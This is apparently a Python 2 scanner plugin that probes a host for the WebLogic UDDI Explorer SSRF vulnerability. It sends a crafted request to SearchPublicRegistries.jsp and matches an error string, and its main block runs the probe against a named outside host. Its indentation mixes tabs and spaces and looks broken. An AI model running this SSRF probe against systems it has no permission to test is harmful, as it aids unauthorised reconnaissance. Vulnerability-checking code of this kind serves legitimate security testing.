#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''

'''
import re
from ..miniCurl import Curl
from ..t import T
from termcolor import cprint

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg+'uddiexplorer/SearchPublicRegistries.jsp?operator=operator=10.301.0.0:80&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search'
        code, head, res, errcode, _ = curl.curl2(url)
        # print res
    	# because operator指定的测试ip没有设定协议，所以是no portocol，如果指定http://10.301.0.0则发挥的直接是operator=xxx.
	    # 其实这么测试，只是测试是否可以访问这个连接，并没有真正的判断是否开放端口？
        if code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException: no protocol: operator=10.301.0.0:80' in res:
	    cprint(arg + '存在weblogic SSRF漏洞', 'yellow')
            output(arg,result,'中危(WARNING)')
        del curl
        return result


def output(url,result,label):
    info = url + ' has weblogic SSRF weblogic  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='weblogic Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/weblogic/weblogic_2d6263a1eabf3ca63e9857aadaf31087.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/weblogic/weblogic_2d6263a1eabf3ca63e9857aadaf31087.py
#/root/github/poccreate/codesrc/exp-2215.py
